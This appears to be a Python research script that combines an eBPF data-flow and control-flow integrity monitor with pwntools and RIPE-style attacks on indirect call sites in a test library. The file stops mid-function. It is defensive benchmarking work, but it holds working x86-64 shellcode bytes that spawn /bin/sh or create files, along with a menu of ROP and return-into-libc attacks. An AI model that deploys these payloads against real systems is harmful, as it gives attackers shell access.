#!/usr/bin/env python3
"""
dfi_rop.py - 三层DFI保护 + pwntools式ROP攻击
结合 dfi.py 的DFI监控框架与 ripe_attack_test.c 的攻击方式
使用 pwntools 生成 shellcode / ROP链，针对 test.so 的间接调用站点进行攻击
BPF 逻辑与 dfi.py 完全一致
"""

from bcc import BPF
import ctypes
import os
import re
import sys
import threading
import time
import argparse
from capstone import Cs, CS_ARCH_X86, CS_MODE_64
import csv
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

if os.geteuid() != 0:
    if '--list' in sys.argv or '-h' in sys.argv or '--help' in sys.argv:
        pass
    else:
        print("Run with sudo!")
        sys.exit(1)

# ======================== CTypes 结构体 ========================

class CfiEntry(ctypes.Structure):
    _fields_ = [
        ("src_addr", ctypes.c_uint64),
        ("src_func_addr", ctypes.c_uint64),
        ("dst_addr", ctypes.c_uint64),
        ("jump_type", ctypes.c_uint8),
        ("is_indirect", ctypes.c_uint8),
        ("src_func", ctypes.c_char * 64),
        ("dst_func", ctypes.c_char * 64),
        ("opcode", ctypes.c_uint8),
    ]

class JumpEvent(ctypes.Structure):
    _fields_ = [
        ("src_offset", ctypes.c_uint64),
        ("dst_offset", ctypes.c_uint64),
        ("expected_dst", ctypes.c_uint64),
        ("jump_type", ctypes.c_uint8),
        ("is_indirect", ctypes.c_uint8),
        ("is_correct", ctypes.c_uint8),
        ("src_func", ctypes.c_char * 64),
        ("dst_func", ctypes.c_char * 64),
        ("src_addr", ctypes.c_uint64),
        ("src_func_addr", ctypes.c_uint64),
        ("cfi_dst_addr", ctypes.c_uint64),
        ("timestamp_ns", ctypes.c_uint64),
        ("cpu", ctypes.c_uint32),
        ("pid", ctypes.c_uint32),
        ("reg_rax", ctypes.c_uint64),
        ("reg_rcx", ctypes.c_uint64),
        ("reg_rdx", ctypes.c_uint64),
        ("reg_rbx", ctypes.c_uint64),
        ("reg_rsp", ctypes.c_uint64),
        ("reg_rbp", ctypes.c_uint64),
        ("reg_rsi", ctypes.c_uint64),
        ("reg_rdi", ctypes.c_uint64),
        ("insn_bytes", ctypes.c_uint8 * 16),
        ("real_target", ctypes.c_uint64),
        ("insn_len", ctypes.c_uint64),
        ("runtime_ip", ctypes.c_uint64),
        ("module_base_addr", ctypes.c_uint64),
        ("ret_addr", ctypes.c_uint64),
        ("saved_rax_val", ctypes.c_uint64),
        ("saved_rsp_val", ctypes.c_uint64),
        ("call_stack_hash", ctypes.c_uint64),
        ("ptr_origin", ctypes.c_uint64),
    ]

class DfiLayerMeta(ctypes.Structure):
    _fields_ = [
        ("site_id", ctypes.c_uint32),
        ("reg_sel", ctypes.c_uint32),
        ("instr_type", ctypes.c_uint32),
        ("extra", ctypes.c_int32),
        ("instr_len", ctypes.c_uint32),
        ("need_deref", ctypes.c_uint32),
        ("save_target_to_saved_rax", ctypes.c_uint32),
        ("save_target_to_saved_rsp", ctypes.c_uint32),
        ("func_name", ctypes.c_char * 64),
    ]

class DfiLayerEvent(ctypes.Structure):
    _fields_ = [
        ("site_id", ctypes.c_uint32),
        ("layer", ctypes.c_uint32),
        ("reg_value", ctypes.c_uint64),
        ("target_addr", ctypes.c_uint64),
        ("inst_offset", ctypes.c_uint64),
        ("timestamp", ctypes.c_uint64),
        ("pid", ctypes.c_uint32),
        ("cpu", ctypes.c_uint32),
        ("func_name", ctypes.c_char * 64),
    ]

# ======================== 常量定义 ========================

REG_ALIASES = {
    'rax':'rax','eax':'rax','ax':'rax','al':'rax','ah':'rax',
    'rbx':'rbx','ebx':'rbx','bx':'rbx','bl':'rbx','bh':'rbx',
    'rcx':'rcx','ecx':'rcx','cx':'rcx','cl':'rcx','ch':'rcx',
    'rdx':'rdx','edx':'rdx','dx':'rdx','dl':'rdx','dh':'rdx',
    'rsi':'rsi','esi':'rsi','si':'rsi','sil':'rsi',
    'rdi':'rdi','edi':'rdi','di':'rdi','dil':'rdi',
    'rbp':'rbp','ebp':'rbp','bp':'rbp','bpl':'rbp',
    'rsp':'rsp','esp':'rsp','sp':'rsp','spl':'rsp',
    'r8':'r8','r8d':'r8','r8w':'r8','r8b':'r8',
    'r9':'r9','r9d':'r9','r9w':'r9','r9b':'r9',
    'r10':'r10','r10d':'r10','r10w':'r10','r10b':'r10',
    'r11':'r11','r11d':'r11','r11w':'r11','r11b':'r11',
    'r12':'r12','r12d':'r12','r12w':'r12','r12b':'r12',
    'r13':'r13','r13d':'r13','r13w':'r13','r13b':'r13',
    'r14':'r14','r14d':'r14','r14w':'r14','r14b':'r14',
    'r15':'r15','r15d':'r15','r15w':'r15','r15b':'r15',
}

REG_TO_IDX = {
    'rax': 0, 'rcx': 1, 'rdx': 2, 'rbx': 3,
    'rbp': 5, 'rsi': 6, 'rdi': 7, 'r8': 8, 'r9': 9,
    'rsp': 4,
}

# RIPE shellcode (from ripe_attack_test.c)
RIPE_SHELLCODE_NONOP = (
    b"\x48\x83\xec\x08"
    b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48"
    b"\x89\xe7\x48\x31\xd2\x6a\x3b\x58\x0f\x05"
)

RIPE_SHELLCODE_SIMPLENOP = b'\x90' * 32 + RIPE_SHELLCODE_NONOP

RIPE_SHELLCODE_POLYNOP = (
    b"\x99\x96\x97\x93\x91\x4d\x48\x47\x4f\x40\x41\x37\x3f\x97\x46\x4e\xf8"
    b"\x92\xfc\x98\x27\x2f\x9f\xf9\x4a\x44\x42\x43\x49\x4b\xf5\x45\x4c"
) + RIPE_SHELLCODE_NONOP

RIPE_SHELLCODE_CREATEFILE = (
    b'\x90' * 32 +
    b"\xeb\x18\x5f\x31\xc0\x88\x47\x14\x6a\x55\x58\x31\xf6\x66\xbe"
    b"\xc0\x01\x0f\x05\x31\xff\x6a\x3c\x58\x0f\x05\xe8\xe3\xff\xff"
    b"\xff/tmp/rip-eval/f_xxxx"
)

ATTACK_TYPES = {
    'nonop':          {'shellcode': 'nonop',          'desc': '纯shellcode (RIPE 风格)'},
    'simplenop':      {'shellcode': 'simplenop',      'desc': 'NOP滑板 + shellcode'},
    'polynop':        {'shellcode': 'polynop',        'desc': '多态NOP + shellcode'},
    'createfile':     {'shellcode': 'createfile',     'desc': '创建文件 /tmp/rip-eval/f_xxxx'},
    'returnintolibc': {'shellcode': 'returnintolibc', 'desc': '返回libc (creat/system)'},
    'rop':            {'shellcode': 'rop',            'desc': 'ROP链攻击'},
    'sh':             {'shellcode': 'sh',             'desc': 'pwntools /bin/sh'},
    'exit0':          {'shellcode': 'exit0',          'desc': '安全退出 exit(0)'},
}

TARGET_TRIGGERS = {
    0: {'name': 'test_indirect_call',   'trigger': 'test_indirect_call',   'var': 'indirect_call_ptr'},
    1: {'name': 'test_indirect_jump',   'trigger': 'test_all',             'var': 'indirect_call_ptr'},
    2: {'name': 'test_ff_instructions', 'trigger': 'test_all',             'var': 'indirect_call_ptr'},
    3: {'name': 'test_ff_instructions', 'trigger': 'test_all',             'var': 'indirect_call_ptr'},
    4: {'name': 'deregister_tm_clones', 'trigger': None,                   'var': None},
    5: {'name': 'register_tm_clones',   'trigger': None,                   'var': None},
}

# ======================== 指令分类 ========================

def classify_instr(instr_text):
    i = instr_text.strip()
    if re.match(r'^(ret|retq)$', i):
        return (4, 0, 1)
    if re.match(r'^(call|jmp|jmpq|ljmp)\s+\*%[a-z0-9]+', i):
        return (0, 0, 3)
    if re.match(r'^mov\s+\(%[a-z0-9]+\),\s*%[a-z0-9]+', i):
        return (1, 0, 3)
    m = re.match(r'^mov\s+(0x[0-9a-fA-F]+)\(%rip\),\s*%[a-z0-9]+', i)
    if m:
        disp = int(m.group(1), 16)
        return (2, disp, 7)
    m = re.match(r'^mov\s+(-?0x[0-9a-fA-F]+)\(%rbp\),\s*%[a-z0-9]+', i)
    if m:
        disp = int(m.group(1), 16)
        return (3, disp, 4)
    m = re.match(r'^mov\s+-(0x[0-9a-fA-F]+)\(%rbp\),\s*%[a-z0-9]+', i)
    if m:
        disp = -int(m.group(1), 16)
        return (3, disp, 4)
    if re.match(r'^lea\s+', i):
        return (0, 0, 7)
    return (1, 0, 3)

# ======================== DFI 三层链解析 (与 dfi.py 一致) ========================

def parse_df1_layer_chains():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    instr_csv = os.path.join(script_dir, 'register_dfi_instructions.csv')
    du_csv = os.path.join(script_dir, 'register_dfi_def_use_chains.csv')

    instr_map = {}
    func_bases = {}
    reg_based_jumps = []

    with open(instr_csv, 'r', encoding='utf-8-sig') as f:
        reader = csv.DictReader(f)
        for row in reader:
            func = row['function']
            addr = int(row['address'], 16)
            instr_map[(func, addr)] = row
            if func not in func_bases or addr < func_bases[func]:
                func_bases[func] = addr
            if row['indirect_type'] == 'reg_based':
                if row['indirect_call'] == 'Yes' or row['indirect_jump'] == 'Yes':
                    reg_based_jumps.append(row)
            elif row['indirect_type'] == 'ret':
                if row['is_ret'] == 'Yes':
                    reg_based_jumps.append(row)

    du_index = {}
    with open(du_csv, 'r', encoding='utf-8-sig') as f:
        reader = csv.DictReader(f)
        for row in reader:
            reg = row['reg']
            use_func = row['use_func']
            use_addr = int(row['use_addr'], 16)
            def_func = row['def_func']
            def_addr_str = row['def_addr']
            def_addr = int(def_addr_str, 16) if def_addr_str.startswith('0x') else 0
            def_instr = row['def_instr']
            key = (reg, use_func, use_addr)
            if key not in du_index:
                du_index[key] = []
            du_index[key].append({
                'def_func': def_func,
                'def_addr': def_addr,
                'def_instr': def_instr,
            })

    layer_chains = []
    for jump_row in reg_based_jumps:
        func = jump_row['function']
        jump_addr = int(jump_row['address'], 16)
        instr = jump_row['instruction']
        func_base = func_bases.get(func, jump_addr)

        reg_match = re.search(r'\*(%[a-z0-9]+)', instr)
        if not reg_match:
            if re.match(r'^(ret|retq)$', instr.strip()):
                reg_name = 'rsp'
            else:
                continue
        else:
            reg_name_raw = reg_match.group(1).lstrip('%')
            reg_name = REG_ALIASES.get(reg_name_raw, reg_name_raw)

        chain_key = (reg_name, func, jump_addr)
        def_entries = du_index.get(chain_key, [])
        def_entries.sort(key=lambda x: x['def_addr'], reverse=True)

        seen_addr = set()
        unique_defs = []
        for d in def_entries:
            if d['def_addr'] not in seen_addr and d['def_addr'] != 0:
                seen_addr.add(d['def_addr'])
                unique_defs.append(d)

        layers = []
        t1, e1, l1 = classify_instr(instr)
        layers.append({
            'level': 1,
            'def_addr': jump_addr,
            'offset': jump_addr - func_base,
            'instr': instr,
            'instr_type': t1,
            'extra': e1,
            'instr_len': l1,
        })
        for i, d in enumerate(unique_defs[:2]):
            t, e, il = classify_instr(d['def_instr'])
            layers.append({
                'level': i + 2,
                'def_addr': d['def_addr'],
                'offset': d['def_addr'] - func_base,
                'instr': d['def_instr'],
                'instr_type': t,
                'extra': e,
                'instr_len': il,
            })
        while len(layers) < 3:
            last = layers[-1].copy()
            last['level'] = len(layers) + 1
            layers.append(last)

        has_deref = any(l['instr_type'] == 1 for l in layers)
        for l in layers:
            if l['instr_type'] in (2, 3):
                l['need_deref'] = 1 if has_deref else 0
            else:
                l['need_deref'] = 0

        save_level = None
        for l in sorted(layers, key=lambda x: -x['level']):
            if l['level'] == 1:
                continue
            if l['instr_type'] in (1, 2, 3):
                save_level = l['level']
                break
        if save_level is None:
            save_level = 2 if len(layers) >= 2 else 1

        save_offset = None
        for l in layers:
            if l['level'] == save_level:
                save_offset = l['offset']
                break

        chain = {
            'func': func,
            'func_base': func_base,
            'jump_addr': jump_addr,
            'reg': reg_name,
            'instr': instr,
            'layers': layers,
            'save_level': save_level,
            'save_offset': save_offset,
        }
        layer_chains.append(chain)

    return layer_chains, func_bases

# ======================== CFI 表解析 ========================

def parse_cfi_table(file_path):
    table = []
    with open(file_path, 'r', newline='', encoding='utf-8') as f:
        reader = csv.DictReader(f)
        for row in reader:
            def to_offset(s):
                return int(s, 16) if s and s != "UNKNOWN" else 0
            src_addr = to_offset(row['jump_instr_address'])
            src_func_addr = to_offset(row['parent_function_start'])
            dst_addr = to_offset(row['target_address'])
            instr_len = int(row.get('instr_len', 0)) if row.get('instr_len') else 0
            instr_content = row.get('instr_content', '').strip()
            instr_bytes = row.get('instr_bytes', '').strip()
            jump_instr = row.get('jump_instr', '').strip()

            if jump_instr in ['callq', 'call']:
                jump_type = 2
            elif jump_instr == 'jmp':
                jump_type = 0
            elif jump_instr in ['ret', 'retq']:
                jump_type = 3
            else:
                jump_type = 1

            is_indirect = 1 if '*' in instr_content else 0
            if is_indirect:
                if jump_type == 2: jump_type = 4
                elif jump_type == 0: jump_type = 5

            if jump_type in (0, 1, 2):
                continue

            src_func = row.get('parent_function_name', 'unknown').encode('utf-8')[:63]
            dst_func = row.get('target_function_name', 'unknown').encode('utf-8')[:63]

            opcode = 0
            if instr_bytes and instr_bytes != '未知':
                opcode = int(instr_bytes.split()[0], 16)

            table.append({
                'src_addr': src_addr,
                'src_func_addr': src_func_addr,
                'dst_addr': dst_addr,
                'jump_type': jump_type,
                'is_indirect': is_indirect,
                'src_func': src_func,
                'dst_func': dst_func,
                'instr_len': instr_len,
                'instr_content': instr_content,
                'instr_bytes': instr_bytes,
                'opcode': opcode,
            })
    print(f" 从 CSV 成功解析 {len(table)} 个静态跳转规则")
    return table

# ======================== BPF 程序 (与 dfi.py 一致) ========================

def get_bpf_text():
    return """
#include <uapi/linux/ptrace.h>

struct cfi_entry {
    u64 src_addr;
    u64 src_func_addr;
    u64 dst_addr;
    u8 jump_type;
    u8 is_indirect;
    char src_func[64];
    char dst_func[64];
    u8 opcode;
};

struct jump_event {
    u64 src_offset;
    u64 dst_offset;
    u64 expected_dst;
    u8 jump_type;
    u8 is_indirect;
    u8 is_correct;
    char src_func[64];
    char dst_func[64];
    u64 src_addr;
    u64 src_func_addr;
    u64 cfi_dst_addr;
    u64 timestamp_ns;
    u32 cpu;
    u32 pid;
    u64 reg_rax;
    u64 reg_rcx;
    u64 reg_rdx;
    u64 reg_rbx;
    u64 reg_rsp;
    u64 reg_rbp;
    u64 reg_rsi;
    u64 reg_rdi;
    u8 insn_bytes[16];
    u64 real_target;
    u8 insn_len;
    u64 runtime_ip;
    u64 module_base_addr;
    u64 ret_addr;
    u64 saved_rax_val;
    u64 saved_rsp_val;
    u64 call_stack_hash;
    u64 ptr_origin;
};

BPF_HASH(cfi_map, u64, struct cfi_entry);
BPF_HASH(module_base, u64, u64);
BPF_PERF_OUTPUT(jump_events);
BPF_HASH(saved_rax, u32, u64);
BPF_HASH(saved_rsp, u64, u64);
BPF_HASH(ret_depth, u32, u32);

BPF_HASH(ptr_origin_map, u64, u64);
BPF_HASH(call_stack_hash_map, u32, u64);
BPF_HASH(func_heads, u64, u32);
BPF_HASH(ret_targets, u64, u32);

struct dfi_layer_meta {
    u32 site_id;
    u32 reg_sel;
    u32 instr_type;
    s32 extra;
    u32 instr_len;
    u32 need_deref;
    u32 save_target_to_saved_rax;
    u32 save_target_to_saved_rsp;
    char func_name[64];
};

struct dfi_layer_event_t {
    u32 site_id;
    u32 layer;
    u64 reg_value;
    u64 target_addr;
    u64 inst_offset;
    u64 timestamp;
    u32 pid;
    u32 cpu;
    char func_name[64];
};

BPF_HASH(dfi_l1_cfg, u64, struct dfi_layer_meta);
BPF_HASH(dfi_l2_cfg, u64, struct dfi_layer_meta);
BPF_HASH(dfi_l3_cfg, u64, struct dfi_layer_meta);
BPF_HASH(dfi_layer_vals, u64, u64);
BPF_PERF_OUTPUT(dfi_layer_events);

static inline int dfi_do_probe(struct pt_regs *ctx, u32 layer,
                                struct dfi_layer_meta *meta, u64 offset) {
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    u64 ip = PT_REGS_IP(ctx);
    u64 reg_val = 0;
    u64 target = 0;

    switch (meta->instr_type) {
    case 0:
        {
            u64 tmp = 0;
            if (meta->reg_sel == 0) bpf_probe_read(&tmp, sizeof(tmp), &ctx->ax);
            else if (meta->reg_sel == 1) bpf_probe_read(&tmp, sizeof(tmp), &ctx->cx);
            else if (meta->reg_sel == 2) bpf_probe_read(&tmp, sizeof(tmp), &ctx->dx);
            else if (meta->reg_sel == 3) bpf_probe_read(&tmp, sizeof(tmp), &ctx->bx);
            else if (meta->reg_sel == 4) bpf_probe_read(&tmp, sizeof(tmp), &ctx->sp);
            else if (meta->reg_sel == 5) bpf_probe_read(&tmp, sizeof(tmp), &ctx->bp);
            else if (meta->reg_sel == 6) bpf_probe_read(&tmp, sizeof(tmp), &ctx->si);
            else if (meta->reg_sel == 7) bpf_probe_read(&tmp, sizeof(tmp), &ctx->di);
            else if (meta->reg_sel == 8) bpf_probe_read(&tmp, sizeof(tmp), &ctx->r8);
            else if (meta->reg_sel == 9) bpf_probe_read(&tmp, sizeof(tmp), &ctx->r9);
            reg_val = tmp;
            target = tmp;
        }
        break;

    case 1:
        {
            u64 tmp = 0;
            if (meta->reg_sel == 0) bpf_probe_read(&tmp, sizeof(tmp), &ctx->ax);
            else if (meta->reg_sel == 1) bpf_probe_read(&tmp, sizeof(tmp), &ctx->cx);
            else if (meta->reg_sel == 2) bpf_probe_read(&tmp, sizeof(tmp), &ctx->dx);
            else if (meta->reg_sel == 3) bpf_probe_read(&tmp, sizeof(tmp), &ctx->bx);
            else if (meta->reg_sel == 4) bpf_probe_read(&tmp, sizeof(tmp), &ctx->sp);
            else if (meta->reg_sel == 5) bpf_probe_read(&tmp, sizeof(tmp), &ctx->bp);
            else if (meta->reg_sel == 6) bpf_probe_read(&tmp, sizeof(tmp), &ctx->si);
            else if (meta->reg_sel == 7) bpf_probe_read(&tmp, sizeof(tmp), &ctx->di);
            else if (meta->reg_sel == 8) bpf_probe_read(&tmp, sizeof(tmp), &ctx->r8);
            else if (meta->reg_sel == 9) bpf_probe_read(&tmp, sizeof(tmp), &ctx->r9);
            reg_val = tmp;
            if (reg_val != 0)
                bpf_probe_read_user(&target, sizeof(target), (void *)reg_val);
        }
        break;

    case 2:
        {
            u64 ptr_addr = ip + meta->instr_len + (s64)meta->extra;
            if (bpf_probe_read_user(&reg_val, sizeof(reg_val), (void *)ptr_addr) == 0) {
                if (reg_val != 0 && meta->need_deref)
                    bpf_probe_read_user(&target, sizeof(target), (void *)reg_val);
                else
                    target = reg_val;
            }
        }
        break;

    case 3:
        {
            u64 rbp_val = 0;
            bpf_probe_read(&rbp_val, sizeof(rbp_val), &ctx->bp);
            u64 ptr_addr = rbp_val + (s64)meta->extra;
            if (bpf_probe_read_user(&reg_val, sizeof(reg_val), (void *)ptr_addr) == 0) {
                if (reg_val != 0 && meta->need_deref)
                    bpf_probe_read_user(&target, sizeof(target), (void *)reg_val);
                else
                    target = reg_val;
            }
        }
        break;

    case 4:
        {
            u64 rsp_val = 0;
            bpf_probe_read(&rsp_val, sizeof(rsp_val), &ctx->sp);
            if (bpf_probe_read_user(&reg_val, sizeof(reg_val), (void *)rsp_val) == 0) {
                target = reg_val;
            }
        }
        break;
    }

    u64 key = ((u64)pid << 32) | ((u64)meta->site_id << 8) | layer;
    dfi_layer_vals.update(&key, &reg_val);

    // 等价类校验：在"首次从数据段/栈内存读取"的层，直接验证目标是否合法
    if (meta->save_target_to_saved_rax && target != 0) {
        u64 _z = 0;
        u64 *_mb = module_base.lookup(&_z);
        if (_mb) {
            u64 target_offset = target - *_mb;
            if (meta->instr_type != 4) {
                u32 *head = func_heads.lookup(&target_offset);
                if (!head) {
                    bpf_send_signal(9);
                    return 0;
                }
            } else {
                u32 *rt = ret_targets.lookup(&target_offset);
                if (!rt) {
                    bpf_send_signal(9);
                    return 0;
                }
            }
        }
        saved_rax.update(&pid, &target);
    }

    struct dfi_layer_event_t evt = {};
    evt.site_id = meta->site_id;
    evt.layer = layer;
    evt.reg_value = reg_val;
    evt.target_addr = target;
    evt.inst_offset = offset;
    evt.timestamp = bpf_ktime_get_ns();
    evt.pid = pid;
    evt.cpu = bpf_get_smp_processor_id();
    bpf_probe_read(evt.func_name, sizeof(evt.func_name), meta->func_name);
    dfi_layer_events.perf_submit(ctx, &evt, sizeof(evt));
    return 0;
}

int trace_ret_target(struct pt_regs *ctx) {
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    u32 *dp = ret_depth.lookup(&pid);
    u32 depth = dp ? (*dp + 1) : 1;
    ret_depth.update(&pid, &depth);
    u64 rsp;
    bpf_probe_read(&rsp, sizeof(rsp), &ctx->sp);
    u64 ret_addr = 0;
    if (bpf_probe_read_user(&ret_addr, sizeof(ret_addr), (void *)rsp) != 0) {
        bpf_send_signal(9);
        return 0;
    }
    u64 key = ((u64)pid << 32) | depth;
    saved_rsp.update(&key, &ret_addr);
    u64 *old_hash = call_stack_hash_map.lookup(&pid);
    u64 new_hash = old_hash ? (*old_hash * 1103515245 + (ret_addr & 0xFFFF)) : ret_addr;
    call_stack_hash_map.update(&pid, &new_hash);
    return 0;
}

int trace_df1_l1(struct pt_regs *ctx) {
    u64 ip = PT_REGS_IP(ctx);
    u64 zero = 0;
    u64 *bp = module_base.lookup(&zero);
    if (!bp) return 0;
    u64 offset = ip - *bp;
    struct dfi_layer_meta *meta = dfi_l1_cfg.lookup(&offset);
    if (!meta) return 0;
    return dfi_do_probe(ctx, 1, meta, offset);
}

int trace_df1_l2(struct pt_regs *ctx) {
    u64 ip = PT_REGS_IP(ctx);
    u64 zero = 0;
    u64 *bp = module_base.lookup(&zero);
    if (!bp) return 0;
    u64 offset = ip - *bp;
    struct dfi_layer_meta *meta = dfi_l2_cfg.lookup(&offset);
    if (!meta) return 0;
    return dfi_do_probe(ctx, 2, meta, offset);
}

int trace_df1_l3(struct pt_regs *ctx) {
    u64 ip = PT_REGS_IP(ctx);
    u64 zero = 0;
    u64 *bp = module_base.lookup(&zero);
    if (!bp) return 0;
    u64 offset = ip - *bp;
    struct dfi_layer_meta *meta = dfi_l3_cfg.lookup(&offset);
    if (!meta) return 0;
    return dfi_do_probe(ctx, 3, meta, offset);
}

int trace_rax(struct pt_regs *ctx) {
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    u64 rax;
    bpf_probe_read(&rax, sizeof(rax), &ctx->ax);
    u64 target;
    if (bpf_probe_read_user(&target, sizeof(target), (void *)rax) == 0) {
        saved_rax.update(&pid, &target);
    } else {
        u64 zero = 0;
        saved_rax.update(&pid, &zero);
    }
    return 0;
}

int trace_ptr_store(struct pt_regs *ctx) {
    u64 ip = PT_REGS_IP(ctx);
    u64 zero = 0;
    u64 *bp = module_base.lookup(&zero);
    if (!bp) return 0;
    u64 origin_offset = ip - *bp;
    u64 ptr_addr = 0;
    bpf_probe_read(&ptr_addr, sizeof(ptr_addr), &ctx->bx);
    u64 func_val = 0;
    bpf_probe_read(&func_val, sizeof(func_val), &ctx->ax);
    if (ptr_addr != 0 && func_val != 0) {
        ptr_origin_map.update(&ptr_addr, &origin_offset);
    }
    return 0;
}

int trace_all_jumps(struct pt_regs *ctx) {
    u64 key = 0;
    u64 *base_ptr = module_base.lookup(&key);
    if (!base_ptr) return 0;
    u64 base = *base_ptr;

    u64 ip = PT_REGS_IP(ctx);
    if (ip < base) return 0;

    u64 offset = ip - base;

    struct cfi_entry *entry = cfi_map.lookup(&offset);
    if (!entry) return 0;

    u32 pid = bpf_get_current_pid_tgid() >> 32;

    struct jump_event event = {};
    event.runtime_ip = ip;
    event.module_base_addr = base;
    event.src_offset = offset;
    event.src_addr = entry->src_addr;
    event.cfi_dst_addr = entry->dst_addr;
    event.jump_type = entry->jump_type;
    event.is_indirect = entry->is_indirect;
    event.timestamp_ns = bpf_ktime_get_ns();
    event.cpu = bpf_get_smp_processor_id();
    event.pid = pid;
    bpf_probe_read(&event.reg_rax, sizeof(event.reg_rax), &ctx->ax);
    bpf_probe_read(&event.reg_rcx, sizeof(event.reg_rcx), &ctx->cx);
    bpf_probe_read(&event.reg_rdx, sizeof(event.reg_rdx), &ctx->dx);
    bpf_probe_read(&event.reg_rbx, sizeof(event.reg_rbx), &ctx->bx);
    bpf_probe_read(&event.reg_rsp, sizeof(event.reg_rsp), &ctx->sp);
    bpf_probe_read(&event.reg_rbp, sizeof(event.reg_rbp), &ctx->bp);
    bpf_probe_read(&event.reg_rsi, sizeof(event.reg_rsi), &ctx->si);
    bpf_probe_read(&event.reg_rdi, sizeof(event.reg_rdi), &ctx->di);

    bpf_probe_read(event.insn_bytes, 16, (void*)ip);
    bpf_probe_read(event.src_func, 64, entry->src_func);
    bpf_probe_read(event.dst_func, 64, entry->dst_func);

    u64 *csh = call_stack_hash_map.lookup(&pid);
    event.call_stack_hash = csh ? *csh : 0;

    event.ptr_origin = 0;
    if (entry->jump_type == 4 || entry->jump_type == 5) {
        u64 *origin_ptr = ptr_origin_map.lookup(&event.reg_rbx);
        if (origin_ptr) {
            event.ptr_origin = *origin_ptr;
        } else {
            origin_ptr = ptr_origin_map.lookup(&event.reg_rax);
            if (origin_ptr) {
                event.ptr_origin = *origin_ptr;
            }
        }
    }

    u64 *saved = saved_rax.lookup(&pid);
    if (saved) {
        event.saved_rax_val = *saved;
        if (*saved == event.reg_rax) {
            event.is_correct = 1;
        } else {
            event.is_correct = 0;
        }
    } else {
        event.saved_rax_val = 0;
    }

    if (entry->jump_type == 3) {
        u64 sp;
        bpf_probe_read(&sp, sizeof(sp), &ctx->sp);
        bpf_probe_read(&event.ret_addr, sizeof(event.ret_addr), (void *)sp);

        u32 *dp = ret_depth.lookup(&pid);
        u32 depth = dp ? *dp : 0;
        u64 rkey = ((u64)pid << 32) | depth;
        u64 *saved_rsp_ptr = saved_rsp.lookup(&rkey);

        if (saved_rsp_ptr && *saved_rsp_ptr != 0) {
            event.saved_rsp_val = *saved_rsp_ptr;
            if (*saved_rsp_ptr == event.ret_addr) {
                event.is_correct = 1;
            } else {
                event.is_correct = 0;
            }
        } else {
            event.saved_rsp_val = 0;
        }

        if (depth > 0) {
            depth--;
            ret_depth.update(&pid, &depth);
        }

        u64 *csh_ret = call_stack_hash_map.lookup(&pid);
        if (csh_ret) {
            u64 rev_hash = *csh_ret * 1103515245;
            call_stack_hash_map.update(&pid, &rev_hash);
        }
    }

    jump_events.perf_submit(ctx, &event, sizeof(event));
    return 0;
}
"""

def compute_ec_stats(table, cs_allowed, origin_allowed):
    ec_stats = {}
    cs_config = {}
    for entry in table:
        src = entry['src_addr']
        if entry['jump_type'] not in (3, 4, 5):
            continue
        static_ec = 1
        cs_ec = 0
        for (rh, so), targets in cs_allowed.items():
            if so == src:
                cs_ec = max(cs_ec, len(targets))
        origin_ec = 0
        for origin, targets in origin_allowed.items():
            origin_ec = max(origin_ec, len(targets))
        ec_stats[src] = {
            'static_ec': static_ec,
            'cs_ec': cs_ec if cs_ec > 0 else static_ec,
            'origin_ec': origin_ec if origin_ec > 0 else 1,
        }
        if origin_ec <= 2:
            method = 2
        elif cs_ec <= 5:
            method = 1
        else:
            method = 0
        cs_config[src] = method
    return ec_stats, cs_config

# ---- Call-Site Sensitivity & Origin Sensitivity ----
cs_allowed_targets = {}
cs_training_rounds = 0
cs_max_depth = 3
origin_allowed_targets = {}
ptr_origin_map_py = {}
CFI_MODE = 'train'
CFI_METHOD_CONFIG = {}

# ======================== 事件处理器 (与 dfi.py 一致) ========================

def handle_jump_event(cpu, data, size):
    global event_count, violation_count, base, cfi_lookup
    global cs_allowed_targets, cs_training_rounds
    global origin_allowed_targets, ptr_origin_map_py
    global CFI_MODE, CFI_METHOD_CONFIG
    event = b["jump_events"].event(data)

    jump_type_names = {
        3: "RET", 4: "INDIRECT_CALL", 5: "INDIRECT_JMP"
    }
    jump_type_name = jump_type_names.get(event.jump_type, f"UNKNOWN({event.jump_type})")
    status = "OK" if event.is_correct else "VIOLATION"

    if not event.is_correct:
        violation_count += 1

    src_func_str = event.src_func.decode('utf-8', errors='ignore').split('\x00')[0].strip()
    dst_func_str = event.dst_func.decode('utf-8', errors='ignore').split('\x00')[0].strip()

    src_addr_key = event.src_addr
    cfi_info = cfi_lookup.get(src_addr_key, {})
    instr_len = cfi_info.get('instr_len', 0)
    instr_content = cfi_info.get('instr_content', '未知')
    instr_bytes = cfi_info.get('instr_bytes', '未知')
    csv_opcode = cfi_info.get('opcode', 0)

    print("\n" + "="*80)
    print(f"[CFI] 事件 #{event_count + 1} - {status}")
    print(f"  跳转类型: {jump_type_name} ({event.jump_type})")
    print(f"  源函数: {src_func_str} -> {dst_func_str}")
    print(f"  源偏移: 0x{event.src_offset:x}  RAX: 0x{event.reg_rax:x}")
    print(f"  CFI预期目标: 0x{event.cfi_dst_addr:x}")
    print(f"  saved_rax: 0x{event.saved_rax_val:x}  saved_rsp: 0x{event.saved_rsp_val:x}")

    # 寄存器状态摘要
    print(f"  寄存器: RAX=0x{event.reg_rax:x} RSP=0x{event.reg_rsp:x} RBP=0x{event.reg_rbp:x}")

    # 指令信息
    insn_bytes = bytes(event.insn_bytes)
    insn_hex = ' '.join([f"{b:02x}" for b in insn_bytes[:16]])
    print(f"  指令字节: {insn_hex}")

    if instr_bytes and instr_bytes != '未知' and instr_len > 1:
        csv_first_byte = int(instr_bytes.split()[0], 16)
        new_insn_bytes = [csv_first_byte] + list(insn_bytes[1:instr_len])
        new_insn_hex = ' '.join([f"{b:02x}" for b in new_insn_bytes])
        print(f"  合成指令: {new_insn_hex}")
        md = Cs(CS_ARCH_X86, CS_MODE_64)
        md.detail = True
        for insn in md.disasm(bytes(new_insn_bytes), event.src_offset):
            target_offset = None
            if insn.mnemonic.startswith(('j', 'call')):
                if len(insn.operands) > 0:
                    op = insn.operands[0]
                    if op.type == 1:
                        target_offset = op.imm
            print(f"    反汇编: {insn.mnemonic} {insn.op_str}")
            if target_offset is not None:
                target_abs = base + target_offset
                print(f"      目标偏移: 0x{target_offset:x}  绝对: 0x{target_abs:x}")
            break

    # 验证结果
    if event.jump_type in [4, 5]:
